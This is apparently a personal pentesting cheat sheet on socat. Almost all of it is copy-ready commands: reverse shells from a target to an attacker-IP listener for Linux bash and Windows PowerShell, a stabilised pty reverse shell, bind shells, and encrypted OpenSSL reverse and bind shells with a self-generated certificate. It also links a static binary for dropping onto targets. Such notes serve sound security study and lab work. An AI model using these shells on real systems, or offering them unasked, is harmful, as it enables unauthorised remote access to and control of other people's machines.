**Type:** #type/tool
**Tags:**  #tech/shell
**Link:** https://www.redhat.com/sysadmin/getting-started-socat
**Purpose:** sophisticated reverse shell tool

---
# Info
sophisticated reverse shell tool, however, special payload is required for connection
static binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
# Usage
## Reverse Shell
start socat listener:
`socat TCP-L:<port> -`
connect to listener:
Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
	the pipes argument forces windows to use unix style pipes
Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
### only for linux: stable reverse shell:
start istener:
``socat TCP-L:<port> FILE:`tty`,raw,echo=0``
to this listener, you can only connect with a special socat payload, which has to be downloaded to the target machine first. See [[3_Tools/shells/Netcat]] section "stabilisation" with socat
connect to listener:
`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
- **EXEC:"bash -li"**: interactive shell
-   **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
-   **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
    
-   **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
-   **setsid**, creates the process in a new session
-   **sane**, stabilises the terminal, attempting to "normalise" it.
- 
## Bind Shell
on target:
Linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
Windows:`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
on attacker:
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

## Encrypted shell
1. generate certificate (on attacking machine):
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
this creates a key and a certificate file
2. merge the two file into a single -pem file:
`cat shell.key shell.crt > shell.pem`
the pem file has to be used with the listener
**For reverse shell**
1.  setup listener
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
2. connect from target
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"bash -li"`
**For bind shell**
1. copy .pem file to target
2. setup listener on target:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
3. connect from attacker:
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

this can be combined with the "tty method" for linux targets by inserting ``FILE:`tty`,raw,echo=0`` in the listener and `,pty,stderr,sigint,setsid,sane` in the connector (insert both in the second argument)
